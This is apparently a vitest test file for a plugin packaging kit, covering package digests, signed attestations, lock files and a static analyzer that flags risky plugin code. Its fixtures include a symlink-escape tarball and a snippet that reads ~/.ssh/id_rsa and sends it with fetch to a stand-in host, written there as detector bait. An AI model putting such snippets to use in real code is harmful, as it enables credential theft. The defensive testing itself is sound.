import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import * as tar from "tar";
import { afterAll, describe, expect, it } from "vitest";
import { MANIFEST_FILE, parseManifest } from "@tomrade/plugin-sdk";
import {
  analyzePackage,
  attest,
  generateSigningKey,
  packPlugin,
  packageDigest,
  placePackage,
  readLock,
  tierOf,
  unpackPlugin,
  verifyAttestation,
  writeLock
} from "@tomrade/plugin-kit";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "tomrade-kit-"));
afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }));

function fixture(name: string, code: string, extra: Record<string, unknown> = {}) {
  const dir = path.join(tmp, name);
  fs.mkdirSync(path.join(dir, "dist"), { recursive: true });
  fs.writeFileSync(path.join(dir, MANIFEST_FILE), JSON.stringify({ id: `someone/${name}`, version: "1.0.0", title: name, license: "MIT", engines: { sdk: "^0.2.0" }, ...extra }));
  fs.writeFileSync(path.join(dir, "dist/index.js"), code);
  fs.writeFileSync(path.join(dir, "README.md"), `# ${name}\n`);
  fs.writeFileSync(path.join(dir, "notes.txt"), "not shipped");
  return dir;
}

describe("the plugin package", () => {
  it("packs what a plugin ships, unpacks to the same digest, and places versions side by side", async () => {
    const dir = fixture("roundtrip", "export default {}");
    const { file, digest } = await packPlugin(dir, path.join(tmp, "roundtrip.tomrade-plugin"));
    const unpacked = await unpackPlugin(file);
    expect(unpacked.digest).toBe(digest);
    expect(fs.existsSync(path.join(unpacked.dir, "notes.txt"))).toBe(false);
    const placed = placePackage(unpacked, path.join(tmp, "root"));
    expect(placed).toBe(path.join(tmp, "root", "someone", "roundtrip", "1.0.0"));
    expect(packageDigest(placed)).toBe(digest);
    fs.appendFileSync(path.join(placed, "dist/index.js"), "\n// edited");
    expect(packageDigest(placed)).not.toBe(digest);
  });

  it("refuses a package carrying a link, or a path out of its directory", async () => {
    const evil = path.join(tmp, "evil");
    fs.mkdirSync(evil, { recursive: true });
    fs.writeFileSync(path.join(evil, MANIFEST_FILE), JSON.stringify({ id: "someone/evil", version: "1.0.0", title: "evil", license: "MIT", engines: { sdk: "^0.2.0" } }));
    fs.symlinkSync("/etc/hosts", path.join(evil, "hosts"));
    const file = path.join(tmp, "evil.tomrade-plugin");
    await tar.c({ gzip: true, file, cwd: evil, portable: true }, [MANIFEST_FILE, "hosts"]);
    await expect(unpackPlugin(file)).rejects.toThrow(/SymbolicLink/);
  });

  it("trusts an attestation only for the digest it names and only under a known key", () => {
    const key = generateSigningKey();
    const digest = "a".repeat(64);
    const claims = { v: 1 as const, id: "someone/x", version: "1.0.0", digest, tier: "ai-reviewed" as const, risk: "low" as const, issuedAt: 1 };
    const signed = attest(claims, key.privateKey);
    expect(verifyAttestation(signed, digest, { [key.keyId]: key.publicKey })).not.toBeNull();
    expect(verifyAttestation(signed, "b".repeat(64), { [key.keyId]: key.publicKey })).toBeNull();
    expect(verifyAttestation({ ...signed, tier: "official" }, digest, { [key.keyId]: key.publicKey })).toBeNull();
    expect(verifyAttestation(signed, digest, { [generateSigningKey().keyId]: key.publicKey })).toBeNull();
  });

  it("keeps the lock whole and says how each entry is trusted", () => {
    const file = path.join(tmp, "lock", "plugins.lock.json");
    writeLock(file, { v: 1, plugins: [{ id: "someone/x", version: "1.0.0", dir: "/x", digest: "d", source: "file", disabled: false, previous: null, confirmed: [], modified: false, autoUpdate: false, attestation: null, installedAt: 1, updatedAt: 1 }] });
    const [entry] = readLock(file).plugins;
    expect(tierOf(entry!)).toBe("local");
    expect(tierOf({ ...entry!, source: "studio" })).toBe("dev");
  });
});

describe("the static analyzer", () => {
  const read = (name: string, code: string, extra?: Record<string, unknown>) => {
    const dir = fixture(name, code, extra);
    return analyzePackage(dir, parseManifest(JSON.parse(fs.readFileSync(path.join(dir, MANIFEST_FILE), "utf8"))));
  };

  it("finds nothing to say about a plugin that only uses the SDK", () => {
    const result = read("clean", `import { definePlugin } from "@tomrade/plugin-sdk"; export default definePlugin({ inject: ["items"], async apply(ctx) { await ctx.items.list(); } });`);
    expect(result.findings).toEqual([]);
    expect(result.observed.network).toBe(false);
  });

  it("reads what the code does and names where the manifest says less", () => {
    const result = read(
      "busy",
      `import { exec } from "node:child_process"; import fs from "fs";
       export default { apply() { fetch("https://api.example.com/v1"); exec("ls"); fs.readFileSync("x"); return process.env.OPENAI_API_KEY; } };`,
      { permissions: { network: ["example.org"] } }
    );
    expect(result.observed).toMatchObject({ exec: true, fs: true, network: true, env: true, hosts: ["api.example.com"] });
    expect(result.findings.map((f) => f.rule).sort()).toEqual(["env", "exec", "undeclared-exec", "undeclared-fs", "undeclared-hosts"]);
    expect(result.worst).toBe("high");
  });

  it("treats the marks of malice as critical", () => {
    const result = read("bad", `const key = require("fs").readFileSync(require("os").homedir() + "/.ssh/id_rsa"); fetch("https://x.example/" + key); var _0x3a2f = 1;`);
    expect(result.findings.filter((f) => f.severity === "critical").map((f) => f.rule).sort()).toEqual(["credential-paths", "obfuscated"]);
  });

  it("names SQL that writes the app's own tables and remote scripts in documents", () => {
    const dir = fixture("sql", `export default { async apply(ctx) { await ctx.db.run(p, "UPDATE items SET title = 'x'"); } };`, { inject: ["db"] });
    fs.writeFileSync(path.join(dir, "dist/face.html"), `<script src="https://cdn.example.com/x.js"></script><script>eval("1")</script>`);
    const result = analyzePackage(dir, parseManifest(JSON.parse(fs.readFileSync(path.join(dir, MANIFEST_FILE), "utf8"))));
    expect(result.observed.coreTableWrites).toEqual(["items"]);
    expect(result.findings.map((f) => f.rule).sort()).toEqual(["core-table-write", "eval", "remote-script", "undeclared-network"]);
  });
});
